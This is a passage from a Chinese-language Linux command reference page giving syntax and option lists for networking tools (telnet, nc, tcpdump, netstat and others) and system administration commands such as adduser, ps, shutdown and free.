class="headerlink" title="telnet"></a>telnet</h4><p>Linux telnet命令用于远端登入。<br>执行telnet指令开启终端机阶段作业，并登入远端主机。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">telnet <span class="hljs-selector-attr">[-8acdEfFKLrx]</span><span class="hljs-selector-attr">[-b&lt;主机别名&gt;]</span><span class="hljs-selector-attr">[-e&lt;脱离字符&gt;]</span><span class="hljs-selector-attr">[-k&lt;域名&gt;]</span><span class="hljs-selector-attr">[-l&lt;用户名称&gt;]</span><span class="hljs-selector-attr">[-n&lt;记录文件&gt;]</span><span class="hljs-selector-attr">[-S&lt;服务类型&gt;]</span><span class="hljs-selector-attr">[-X&lt;认证形态&gt;]</span><span class="hljs-selector-attr">[主机名称或IP地址&lt;通信端口&gt;]</span><br></code></pre></td></tr></table></figure><p>参数说明：</p><p> -8 允许使用8位字符资料，包括输入与输出。<br>-a 尝试自动登入远端系统。<br>-b&lt;主机别名&gt; 使用别名指定远端主机名称。<br>-c 不读取用户专属目录里的.telnetrc文件。<br>-d 启动排错模式。<br>-e&lt;脱离字符&gt; 设置脱离字符。<br>-E 滤除脱离字符。<br>-f 此参数的效果和指定”-F”参数相同。<br>-F 使用Kerberos V5认证时，加上此参数可把本地主机的认证数据上传到远端主机。<br>-k&lt;域名&gt; 使用Kerberos认证时，加上此参数让远端主机采用指定的领域名，而非该主机的域名。<br>-K 不自动登入远端主机。<br>-l&lt;用户名称&gt; 指定要登入远端主机的用户名称。<br>-L 允许输出8位字符资料。<br>-n&lt;记录文件&gt; 指定文件记录相关信息。<br>-r 使用类似rlogin指令的用户界面。<br>-S&lt;服务类型&gt; 设置telnet连线所需的IP TOS信息。<br>-x 假设主机有支持数据加密的功能，就使用它。<br>-X&lt;认证形态&gt; 关闭指定的认证形态。</p><h4 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h4><p>实现任意TCP&#x2F;UDP端口的侦听，nc可以作为server以TCP或UDP方式侦听指定端口<br>端口的扫描，nc可以作为client发起TCP或UDP连接<br>机器之间传输文件<br>机器之间网络测速</p><p>语法：</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs inform7">nc <span class="hljs-comment">[-46CDdFhklNnrStUuvZz]</span> <span class="hljs-comment">[-I length]</span> <span class="hljs-comment">[-i interval]</span> <span class="hljs-comment">[-M ttl]</span><br>         <span class="hljs-comment">[-m minttl]</span> <span class="hljs-comment">[-O length]</span> <span class="hljs-comment">[-P proxy_username]</span> <span class="hljs-comment">[-p source_port]</span><br>         <span class="hljs-comment">[-q seconds]</span> <span class="hljs-comment">[-s source]</span> <span class="hljs-comment">[-T keyword]</span> <span class="hljs-comment">[-V rtable]</span> <span class="hljs-comment">[-W recvlimit]</span> <span class="hljs-comment">[-w timeout]</span><br>         <span class="hljs-comment">[-X proxy_protocol]</span> <span class="hljs-comment">[-x proxy_address<span class="hljs-comment">[:port]</span>]</span>           <span class="hljs-comment">[destination]</span> <span class="hljs-comment">[port]</span><br></code></pre></td></tr></table></figure><p>参数：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-l    用于指定nc将处于侦听模式。指定该参数，则意味着nc被当作server，侦听并接受连接，而非向其它地址发起连接。</span><br><span class="hljs-deletion">-p    暂未用到（老版本的nc可能需要在端口号前加-p参数，下面测试环境是centos6.6，nc版本是nc-1.84，未用到-p参数）</span><br><span class="hljs-deletion">-s    指定发送数据的源IP地址，适用于多网卡机</span><br><span class="hljs-deletion">-u    指定nc使用UDP协议，默认为TCP</span><br><span class="hljs-deletion">-v    输出交互或出错信息，新手调试时尤为有用</span><br><span class="hljs-deletion">-w    超时秒数，后面跟数字</span><br></code></pre></td></tr></table></figure><h4 id="ifconfig"><a href="#ifconfig" class="headerlink" title="ifconfig"></a>ifconfig</h4><p>Linux ifconfig命令用于显示或设置网络设备。<br>ifconfig可设置网络设备的状态，或是显示目前的设置。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">ifconfig <span class="hljs-selector-attr">[网络设备]</span><span class="hljs-selector-attr">[down up -allmulti -arp -promisc]</span><span class="hljs-selector-attr">[add&lt;地址&gt;]</span><span class="hljs-selector-attr">[del&lt;地址&gt;]</span><span class="hljs-selector-attr">[&lt;hw&lt;网络设备类型&gt;&lt;硬件地址&gt;]</span><span class="hljs-selector-attr">[io_addr&lt;I/O地址&gt;]</span><span class="hljs-selector-attr">[irq&lt;IRQ地址&gt;]</span><span class="hljs-selector-attr">[media&lt;网络媒介类型&gt;]</span><span class="hljs-selector-attr">[mem_start&lt;内存地址&gt;]</span><span class="hljs-selector-attr">[metric&lt;数目&gt;]</span><span class="hljs-selector-attr">[mtu&lt;字节&gt;]</span><span class="hljs-selector-attr">[netmask&lt;子网掩码&gt;]</span><span class="hljs-selector-attr">[tunnel&lt;地址&gt;]</span><span class="hljs-selector-attr">[-broadcast&lt;地址&gt;]</span><span class="hljs-selector-attr">[-pointopoint&lt;地址&gt;]</span><span class="hljs-selector-attr">[IP地址]</span><br></code></pre></td></tr></table></figure><p>参数说明：</p><p>add&lt;地址&gt; 设置网络设备IPv6的IP地址。<br>del&lt;地址&gt; 删除网络设备IPv6的IP地址。<br>down 关闭指定的网络设备。<br>&lt;hw&lt;网络设备类型&gt;&lt;硬件地址&gt; 设置网络设备的类型与硬件地址。<br>io_addr&lt;I&#x2F;O地址&gt; 设置网络设备的I&#x2F;O地址。<br>irq&lt;IRQ地址&gt; 设置网络设备的IRQ。<br>media&lt;网络媒介类型&gt; 设置网络设备的媒介类型。<br>mem_start&lt;内存地址&gt; 设置网络设备在主内存所占用的起始地址。<br>metric&lt;数目&gt; 指定在计算数据包的转送次数时，所要加上的数目。<br>mtu&lt;字节&gt; 设置网络设备的MTU。<br>netmask&lt;子网掩码&gt; 设置网络设备的子网掩码。<br>tunnel&lt;地址&gt; 建立IPv4与IPv6之间的隧道通信地址。<br>up 启动指定的网络设备。<br>-broadcast&lt;地址&gt; 将要送往指定地址的数据包当成广播数据包来处理。<br>-pointopoint&lt;地址&gt; 与指定地址的网络设备建立直接连线，此模式具有保密功能。<br>-promisc 关闭或启动指定网络设备的promiscuous模式。<br>[IP地址] 指定网络设备的IP地址。<br>[网络设备] 指定网络设备的名称。</p><h4 id="mesg和wall"><a href="#mesg和wall" class="headerlink" title="mesg和wall"></a>mesg和wall</h4><p>mesg命令用于设置终端机的写入权限。<br>将mesg设置y时，其他用户可利用write指令将信息直接显示在您的屏幕上。</p><p> wall命令会将讯息传给每一个 mesg 设定为 yes 的上线使用者。当使用终端机介面做为标准传入时, 讯息结束时需加上 EOF</p><p>语法：wall [message]</p><h4 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a>netstat</h4><p>netstat 命令用于显示网络状态。<br>利用 netstat 指令可让你得知整个 Linux 系统的网络情况。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">netstat <span class="hljs-selector-attr">[-acCeFghilMnNoprstuvVwx]</span><span class="hljs-selector-attr">[-A&lt;网络类型&gt;]</span><span class="hljs-selector-attr">[--ip]</span><br></code></pre></td></tr></table></figure><p>参数说明：</p><p>-a或–all 显示所有连线中的Socket。<br>-A&lt;网络类型&gt;或–&lt;网络类型&gt; 列出该网络类型连线中的相关地址。<br>-c或–continuous 持续列出网络状态。<br>-C或–cache 显示路由器配置的快取信息。<br>-e或–extend 显示网络其他相关信息。<br>-F或–fib 显示FIB。<br>-g或–groups 显示多重广播功能群组组员名单。<br>-h或–help 在线帮助。<br>-i或–interfaces 显示网络界面信息表单。<br>-l或–listening 显示监控中的服务器的Socket。<br>-M或–masquerade 显示伪装的网络连线。<br>-n或–numeric 直接使用IP地址，而不通过域名服务器。<br>-N或–netlink或–symbolic 显示网络硬件外围设备的符号连接名称。<br>-o或–timers 显示计时器。<br>-p或–programs 显示正在使用Socket的程序识别码和程序名称。<br>-r或–route 显示Routing Table。<br>-s或–statistics 显示网络工作信息统计表。<br>-t或–tcp 显示TCP传输协议的连线状况。<br>-u或–udp 显示UDP传输协议的连线状况。<br>-v或–verbose 显示指令执行过程。<br>-V或–version 显示版本信息。<br>-w或–raw 显示RAW传输协议的连线状况。<br>-x或–unix 此参数的效果和指定”-A unix”参数相同。<br>–ip或–inet 此参数的效果和指定”-A inet”参数相同。</p><h4 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h4><p>执行ping指令会使用ICMP传输协议，发出要求回应的信息，若远端主机的网络功能没有问题，就会回应该信息，因而得知该主机运作正常。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">ping <span class="hljs-selector-attr">[-dfnqrRv]</span><span class="hljs-selector-attr">[-c&lt;完成次数&gt;]</span><span class="hljs-selector-attr">[-i&lt;间隔秒数&gt;]</span><span class="hljs-selector-attr">[-I&lt;网络界面&gt;]</span><span class="hljs-selector-attr">[-l&lt;前置载入&gt;]</span><span class="hljs-selector-attr">[-p&lt;范本样式&gt;]</span><span class="hljs-selector-attr">[-s&lt;数据包大小&gt;]</span><span class="hljs-selector-attr">[-t&lt;存活数值&gt;]</span><span class="hljs-selector-attr">[主机名称或IP地址]</span><br></code></pre></td></tr></table></figure><p>参数：</p><p>-d 使用Socket的SO_DEBUG功能。<br>-c&lt;完成次数&gt; 设置完成要求回应的次数。<br>-f 极限检测。<br>-i&lt;间隔秒数&gt; 指定收发信息的间隔时间。<br>-I&lt;网络界面&gt; 使用指定的网络接口送出数据包。<br>-l&lt;前置载入&gt; 设置在送出要求信息之前，先行发出的数据包。<br>-n 只输出数值。<br>-p&lt;范本样式&gt; 设置填满数据包的范本样式。<br>-q 不显示指令执行过程，开头和结尾的相关信息除外。<br>-r 忽略普通的Routing Table，直接将数据包送到远端主机上。<br>-R 记录路由过程。<br>-s&lt;数据包大小&gt; 设置数据包的大小。<br>-t&lt;存活数值&gt; 设置存活数值TTL的大小。<br>-v 详细显示指令的执行过程。</p><h4 id="traceroute"><a href="#traceroute" class="headerlink" title="traceroute"></a>traceroute</h4><p>traceroute命令用于显示数据包到主机间的路径。<br>traceroute指令让你追踪网络数据包的路由途径，预设数据包大小是40Bytes，用户可另行设置。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">traceroute <span class="hljs-selector-attr">[-dFlnrvx]</span><span class="hljs-selector-attr">[-f&lt;存活数值&gt;]</span><span class="hljs-selector-attr">[-g&lt;网关&gt;...]</span><span class="hljs-selector-attr">[-i&lt;网络界面&gt;]</span><span class="hljs-selector-attr">[-m&lt;存活数值&gt;]</span><span class="hljs-selector-attr">[-p&lt;通信端口&gt;]</span><span class="hljs-selector-attr">[-s&lt;来源地址&gt;]</span><span class="hljs-selector-attr">[-t&lt;服务类型&gt;]</span><span class="hljs-selector-attr">[-w&lt;超时秒数&gt;]</span><span class="hljs-selector-attr">[主机名称或IP地址]</span><span class="hljs-selector-attr">[数据包大小]</span><br></code></pre></td></tr></table></figure><p>参数说明：</p><p>-d 使用Socket层级的排错功能。<br>-f&lt;存活数值&gt; 设置第一个检测数据包的存活数值TTL的大小。<br>-F 设置勿离断位。<br>-g&lt;网关&gt; 设置来源路由网关，最多可设置8个。<br>-i&lt;网络界面&gt; 使用指定的网络界面送出数据包。<br>-I 使用ICMP回应取代UDP资料信息。<br>-m&lt;存活数值&gt; 设置检测数据包的最大存活数值TTL的大小。<br>-n 直接使用IP地址而非主机名称。<br>-p&lt;通信端口&gt; 设置UDP传输协议的通信端口。<br>-r 忽略普通的Routing Table，直接将数据包送到远端主机上。<br>-s&lt;来源地址&gt; 设置本地主机送出数据包的IP地址。<br>-t&lt;服务类型&gt; 设置检测数据包的TOS数值。<br>-w&lt;超时秒数&gt; 设置等待远端主机回报的时间。<br>-x 开启或关闭数据包的正确性检验。</p><h4 id="tcpdump"><a href="#tcpdump" class="headerlink" title="tcpdump"></a>tcpdump</h4><p> tcpdump命令用于倾倒网络传输数据。<br>执行tcpdump指令可列出经过指定网络界面的数据包文件头，在Linux操作系统中，你必须是系统管理员。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">tcpdump <span class="hljs-selector-attr">[-adeflnNOpqStvx]</span><span class="hljs-selector-attr">[-c&lt;数据包数目&gt;]</span><span class="hljs-selector-attr">[-dd]</span><span class="hljs-selector-attr">[-ddd]</span><span class="hljs-selector-attr">[-F&lt;表达文件&gt;]</span><span class="hljs-selector-attr">[-i&lt;网络界面&gt;]</span><span class="hljs-selector-attr">[-r&lt;数据包文件&gt;]</span><span class="hljs-selector-attr">[-s&lt;数据包大小&gt;]</span><span class="hljs-selector-attr">[-tt]</span><span class="hljs-selector-attr">[-T&lt;数据包类型&gt;]</span><span class="hljs-selector-attr">[-vv]</span><span class="hljs-selector-attr">[-w&lt;数据包文件&gt;]</span><span class="hljs-selector-attr">[输出数据栏位]</span><br></code></pre></td></tr></table></figure><p>参数说明：</p><p>-a 尝试将网络和广播地址转换成名称。<br>-c&lt;数据包数目&gt; 收到指定的数据包数目后，就停止进行倾倒操作。<br>-d 把编译过的数据包编码转换成可阅读的格式，并倾倒到标准输出。<br>-dd 把编译过的数据包编码转换成C语言的格式，并倾倒到标准输出。<br>-ddd 把编译过的数据包编码转换成十进制数字的格式，并倾倒到标准输出。<br>-e 在每列倾倒资料上显示连接层级的文件头。<br>-f 用数字显示网际网络地址。<br>-F&lt;表达文件&gt; 指定内含表达方式的文件。<br>-i&lt;网络界面&gt; 使用指定的网络截面送出数据包。<br>-l 使用标准输出列的缓冲区。<br>-n 不把主机的网络地址转换成名字。<br>-N 不列出域名。<br>-O 不将数据包编码最佳化。<br>-p 不让网络界面进入混杂模式。<br>-q 快速输出，仅列出少数的传输协议信息。<br>-r&lt;数据包文件&gt; 从指定的文件读取数据包数据。<br>-s&lt;数据包大小&gt; 设置每个数据包的大小。<br>-S 用绝对而非相对数值列出TCP关联数。<br>-t 在每列倾倒资料上不显示时间戳记。<br>-tt 在每列倾倒资料上显示未经格式化的时间戳记。<br>-T&lt;数据包类型&gt; 强制将表达方式所指定的数据包转译成设置的数据包类型。<br>-v 详细显示指令执行过程。<br>-vv 更详细显示指令执行过程。<br>-x 用十六进制字码列出数据包资料。<br>-w&lt;数据包文件&gt; 把数据包数据写入指定的文件。</p><h3 id="系统管理"><a href="#系统管理" class="headerlink" title="系统管理"></a>系统管理</h3><h4 id="adduser"><a href="#adduser" class="headerlink" title="adduser"></a>adduser</h4><p>adduser命令用于新增使用者帐号或更新预设的使用者资料。<br>adduser 与 useradd 指令为同一指令（经由符号连结 symbolic link）。<br>使用权限：系统管理员。<br>adduser是增加使用者。相对的，也有删除使用者的指令，userdel。语法:userdel [login ID]</p><p>语法：</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs inform7">adduser <span class="hljs-comment">[-c comment]</span> <span class="hljs-comment">[-d home_dir]</span> <span class="hljs-comment">[-e expire_date]</span> <span class="hljs-comment">[-f inactive_time]</span> <span class="hljs-comment">[-g initial_group]</span> <span class="hljs-comment">[-G group<span class="hljs-comment">[,...]</span>]</span> <span class="hljs-comment">[-m <span class="hljs-comment">[-k skeleton_dir]</span> | -M]</span> <span class="hljs-comment">[-p passwd]</span> <span class="hljs-comment">[-s shell]</span> <span class="hljs-comment">[-u uid <span class="hljs-comment">[ -o]</span>]</span> <span class="hljs-comment">[-n]</span> <span class="hljs-comment">[-r]</span> loginid<br></code></pre></td></tr></table></figure><p>参数：</p><p>-c comment 新使用者位于密码档（通常是 &#x2F;etc&#x2F;passwd）的注解资料<br>-d home_dir 设定使用者的家目录为 home_dir ，预设值为预设的 home 后面加上使用者帐号 loginid<br>-e expire_date 设定此帐号的使用期限（格式为 YYYY-MM-DD），预设值为永久有效</p><h4 id="chfn"><a href="#chfn" class="headerlink" title="chfn"></a>chfn</h4><p>chfn命令提供使用者更改个人资讯，用于 finger and mail username<br>使用权限：所有使用者。</p><h4 id="组管理"><a href="#组管理" class="headerlink" title="组管理"></a>组管理</h4><p>groupadd 添加一个组</p><p>groupmod 用于更改群组识别码或名称</p><p>groupdel 用于删除群组</p><h4 id="halt"><a href="#halt" class="headerlink" title="halt"></a>halt</h4><p>若系统的 runlevel 为 0 或 6 ，则Linux halt命令关闭系统，否则以 shutdown 指令（加上 -h 参数）来取代。<br>使用权限：系统管理者。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">halt <span class="hljs-selector-attr">[-n]</span> <span class="hljs-selector-attr">[-w]</span> <span class="hljs-selector-attr">[-d]</span> <span class="hljs-selector-attr">[-f]</span> <span class="hljs-selector-attr">[-i]</span> <span class="hljs-selector-attr">[-p]</span><br></code></pre></td></tr></table></figure><p>参数：</p><p>-n : 在关机前不做将记忆体资料写回硬盘的动作<br>-w : 并不会真的关机，只是把记录写到 &#x2F;var&#x2F;log&#x2F;wtmp 文件里<br>-d : 不把记录写到 &#x2F;var&#x2F;log&#x2F;wtmp 文件里（-n 这个参数包含了 -d） -f : 强迫关机，不呼叫 shutdown 这个指令<br>-i : 在关机之前先把所有网络相关的装置先停止<br>-p : 当关机的时候，顺便做关闭电源（poweroff）的动作</p><h4 id="last"><a href="#last" class="headerlink" title="last"></a>last</h4><p> last 命令用于显示用户最近登录信息。</p><p>语法：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">last</span> [<span class="hljs-keyword">options</span>]<br></code></pre></td></tr></table></figure><p>参数：</p><p>-R 省略 hostname 的栏位<br>-num 展示前 num 个<br>username 展示 username 的登入讯息<br>tty 限制登入讯息包含终端机代号</p><h4 id="lastb"><a href="#lastb" class="headerlink" title="lastb"></a>lastb</h4><p>lastb命令用于列出登入系统失败的用户相关信息。<br>单独执行lastb指令，它会读取位于&#x2F;var&#x2F;log目录下，名称为btmp的文件，并把该文件内容<br>记录的登入失败的用户名单，全部显示出来。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">lastb <span class="hljs-selector-attr">[-adRx]</span><span class="hljs-selector-attr">[-f &lt;记录文件&gt;]</span><span class="hljs-selector-attr">[-n &lt;显示列数&gt;]</span><span class="hljs-selector-attr">[帐号名称...]</span><span class="hljs-selector-attr">[终端机编号...]</span><br></code></pre></td></tr></table></figure><p>-a 　把从何处登入系统的主机名称或IP地址显示在最后一行。<br>-d 　将IP地址转换成主机名称。<br>-f&lt;记录文件&gt; 　指定记录文件。<br>-n&lt;显示列数&gt;或-&lt;显示列数&gt; 　设置列出名单的显示列数。<br>-R 　不显示登入系统的主机名称或IP地址。<br>-x 　显示系统关机，重新开机，以及执行等级的改变等信息。</p><p>可以通过查看异常登录确定服务器是否遭受ssh爆破攻击，防范手段一般是进行ip的限制和禁止root用户登录和</p><p>修改默认的端口。</p><h4 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h4><p>ps （英文全拼：process status）命令用于显示当前进程的状态，类似于 windows 的任务管理器</p><p>语法：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">ps</span> [<span class="hljs-keyword">options</span>] [--<span class="hljs-keyword">help</span>]<br></code></pre></td></tr></table></figure><p>参数：</p><p>ps 的参数非常多, 在此仅列出几个常用的参数并大略介绍含义<br>-A 列出所有的行程<br>-w 显示加宽可以显示较多的资讯<br>-au 显示较详细的资讯<br>-aux 显示所有包含其他使用者的行程<br>au(x) 输出格式 :<br>USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND<br>USER: 行程拥有者<br>PID: pid<br>%CPU: 占用的 CPU 使用率<br>%MEM: 占用的记忆体使用率<br>VSZ: 占用的虚拟记忆体大小<br>RSS: 占用的记忆体大小<br>TTY: 终端的次要装置号码 (minor device number of tty)<br>STAT: 该行程的状态:<br>D: 无法中断的休眠状态 (通常 IO 的进程)<br>R: 正在执行中<br>S: 静止状态<br>T: 暂停执行<br>Z: 不存在但暂时无法消除<br>W: 没有足够的记忆体分页可分配<br>&lt;: 高优先序的行程<br>N: 低优先序的行程<br>L: 有记忆体分页分配并锁在记忆体内 (实时系统或捱A I&#x2F;O)<br>START: 行程开始时间<br>TIME: 执行的时间<br>COMMAND:所执行的指令</p><h4 id="nice"><a href="#nice" class="headerlink" title="nice"></a>nice</h4><p>nice命令以更改过的优先序来执行程序，如果未指定程序，则会印出目前的排程优先序，内定的 adjustment 为 10，范围为 -20（最高优先序）到 19（最低优先序）。</p><p>语法：</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs inform7">nice <span class="hljs-comment">[-n adjustment]</span> <span class="hljs-comment">[-adjustment]</span> <span class="hljs-comment">[--adjustment=adjustment]</span> <span class="hljs-comment">[--help]</span> <span class="hljs-comment">[--version]</span> <span class="hljs-comment">[command <span class="hljs-comment">[arg...]</span>]</span><br></code></pre></td></tr></table></figure><p>参数：</p><p>-n adjustment, -adjustment, –adjustment&#x3D;adjustment 皆为将该原有优先序的增加 adjustment<br>–help 显示求助讯息<br>–version 显示版本资讯</p><h4 id="top"><a href="#top" class="headerlink" title="top"></a>top</h4><p>top命令用于实时显示 process 的动态。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-attribute">top</span> <span class="hljs-selector-attr">[-]</span> <span class="hljs-selector-attr">[d delay]</span> <span class="hljs-selector-attr">[q]</span> <span class="hljs-selector-attr">[c]</span> <span class="hljs-selector-attr">[S]</span> <span class="hljs-selector-attr">[s]</span> <span class="hljs-selector-attr">[i]</span> <span class="hljs-selector-attr">[n]</span> <span class="hljs-selector-attr">[b]</span><br></code></pre></td></tr></table></figure><p>参数：</p><p>d : 改变显示的更新速度，或是在交谈式指令列( interactive command)按 s<br>q : 没有任何延迟的显示速度，如果使用者是有 superuser 的权限，则 top 将会以最高的优先序执行<br>c : 切换显示模式，共有两种模式，一是只显示执行档的名称，另一种是显示完整的路径与名称S : 累积模式，会将己完成或消失的子行程 ( dead child process ) 的 CPU time 累积起来<br>s : 安全模式，将交谈式指令取消, 避免潜在的危机<br>i : 不显示任何闲置 (idle) 或无用 (zombie) 的行程<br>n : 更新的次数，完成后将会退出 top<br>b : 批次档模式，搭配 “n” 参数一起使用，可以用来将 top 的结果输出到档案内</p><h4 id="pstree"><a href="#pstree" class="headerlink" title="pstree"></a>pstree</h4><p> pstree命令将所有进程以树状图显示，树状图将会以 pid (如果有指定) 或是以 init 这个基本行程为根 (root)，如果有指定使用者 id，则树状图会只显示该使用者所拥有的行程。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">pstree <span class="hljs-selector-attr">[-a]</span> <span class="hljs-selector-attr">[-c]</span> <span class="hljs-selector-attr">[-h|-Hpid]</span> <span class="hljs-selector-attr">[-l]</span> <span class="hljs-selector-attr">[-n]</span> <span class="hljs-selector-attr">[-p]</span> <span class="hljs-selector-attr">[-u]</span> <span class="hljs-selector-attr">[-G|-U]</span> <span class="hljs-selector-attr">[pid|user]</span><br></code></pre></td></tr></table></figure><p>参数：</p><p>-a 显示该行程的完整指令及参数, 如果是被记忆体置换出去的行程则会加上括号<br>-c 如果有重覆的行程名, 则分开列出（预设值是会在前面加上 *）</p><h4 id="shutdown"><a href="#shutdown" class="headerlink" title="shutdown"></a>shutdown</h4><p>shutdown命令可以用来进行关机程序，并且在关机以前传送讯息给所有使用者正在执行的程序，shutdown 也可以用来重开机。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">shutdown <span class="hljs-selector-attr">[-t seconds]</span> <span class="hljs-selector-attr">[-rkhncfF]</span> <span class="hljs-selector-tag">time</span> <span class="hljs-selector-attr">[message]</span><br></code></pre></td></tr></table></figure><p>参数：</p><p>-t seconds : 设定在几秒钟之后进行关机程序。<br>-k : 并不会真的关机，只是将警告讯息传送给所有使用者。<br>-r : 关机后重新开机。<br>-h : 关机后停机。<br>-n : 不采用正常程序来关机，用强迫的方式杀掉所有执行中的程序后自行关机。<br>-c : 取消目前已经进行中的关机动作。<br>-f : 关机时，不做 fcsk 动作(检查 Linux 档系统)。<br>-F : 关机时，强迫进行 fsck 动作。<br>time : 设定关机的时间。<br>message : 传送给所有使用者的警告讯息。</p><h4 id="usermod"><a href="#usermod" class="headerlink" title="usermod"></a>usermod</h4><p>usermod命令用于修改用户帐号。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">usermod <span class="hljs-selector-attr">[-LU]</span><span class="hljs-selector-attr">[-c &lt;备注&gt;]</span><span class="hljs-selector-attr">[-d &lt;登入目录&gt;]</span><span class="hljs-selector-attr">[-e &lt;有效期限&gt;]</span><span class="hljs-selector-attr">[-f &lt;缓冲天数&gt;]</span><span class="hljs-selector-attr">[-g &lt;群组&gt;]</span><span class="hljs-selector-attr">[-G &lt;群组&gt;]</span><span class="hljs-selector-attr">[-l &lt;帐号名称&gt;]</span><span class="hljs-selector-attr">[-s &lt;shell&gt;]</span><span class="hljs-selector-attr">[-u &lt;uid&gt;]</span><span class="hljs-selector-attr">[用户帐号]</span><br></code></pre></td></tr></table></figure><p>参数：</p><p>-c&lt;备注&gt; 　修改用户帐号的备注文字。<br>-d登入目录&gt; 　修改用户登入时的目录。<br>-e&lt;有效期限&gt; 　修改帐号的有效期限。<br>-f&lt;缓冲天数&gt; 　修改在密码过期后多少天即关闭该帐号。<br>-g&lt;群组&gt; 　修改用户所属的群组。<br>-G&lt;群组&gt; 　修改用户所属的附加群组。<br>-l&lt;帐号名称&gt; 　修改用户帐号名称。<br>-L 　锁定用户密码，使密码无效。<br>-s<shell> 　修改用户登入后所使用的shell。<br>-u<uid> 　修改用户ID。<br>-U 　解除密码锁定。</p><h4 id="chsh"><a href="#chsh" class="headerlink" title="chsh"></a>chsh</h4><p>chsh命令用于更改使用者 shell 设定。</p><h4 id="uname"><a href="#uname" class="headerlink" title="uname"></a>uname</h4><p>uname（英文全拼：unix name）命令用于显示系统信息。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">uname <span class="hljs-selector-attr">[-amnrsv]</span><span class="hljs-selector-attr">[--help]</span><span class="hljs-selector-attr">[--version]</span><br></code></pre></td></tr></table></figure><p>参数：</p><p>-a或–all 　显示全部的信息。<br>-m或–machine 　显示电脑类型。<br>-n或-nodename 　显示在网络上的主机名称。<br>-r或–release 　显示操作系统的发行编号。<br>-s或–sysname 　显示操作系统名称。<br>-v 　显示操作系统的版本。<br>–help 　显示帮助。<br>–version 　显示版本信息。</p><h4 id="who"><a href="#who" class="headerlink" title="who"></a>who</h4><p> who命令用于显示系统中有哪些使用者正在上面，显示的资料包含了使用者 ID、使用的终端机、从哪边连上来的、上线时间、呆滞时间、CPU 使用量、动作等等。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">who - <span class="hljs-selector-attr">[husfV]</span> <span class="hljs-selector-attr">[user]</span><br></code></pre></td></tr></table></figure><p>参数：</p><p>-H 或 –heading：显示各栏位的标题信息列；<br>-u 或 –idle：显示闲置时间，若该用户在前一分钟之内有进行任何动作，将标示成”.”号，如果该用户已超过24小时没有任何动作，则标示出”old”字符串；<br>-m：此参数的效果和指定”am i”字符串相同；<br>-q 或–count：只显示登入系统的帐号名称和总人数；<br>-s：此参数将忽略不予处理，仅负责解决who指令其他版本的兼容性问题；<br>-w 或-T或–mesg或–message或–writable：显示用户的信息状态栏；<br>–help：在线帮助；<br>–version：显示版本信息。</p><h4 id="whoami"><a href="#whoami" class="headerlink" title="whoami"></a>whoami</h4><p> whoami命令用于显示自身用户名称。<br>显示自身的用户名称，本指令相当于执行”id -un”指令。</p><h4 id="free"><a href="#free" class="headerlink" title="free"></a>free</h4><p>free命令用于显示内存状态。<br>free指令会显示内存的使用情况，包括实体内存，虚拟的交换文件内存，共享内存区段，以及系统核心使用的缓冲区等。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">free <span class="hljs-selector-attr">[-bkmotV]</span><span class="hljs-selector-attr">[-s &lt;间隔秒数&gt;]</span><br></code></pre></td></tr></table></figure><p>参数：</p><p>-b 　以Byte为单位显示内存使用情况。<br>-k 　以KB为单位显示内存使用情况。<br>-m 　以MB为单位显示内存使用情况。<br>-h 　以合适的单位显示内存使用情况，最大为三位数，自动计算对应的单位值。单位有：<br>B &#x3D; bytes<br>K &#x3D; kilos<br>M &#x3D; megas<br>G 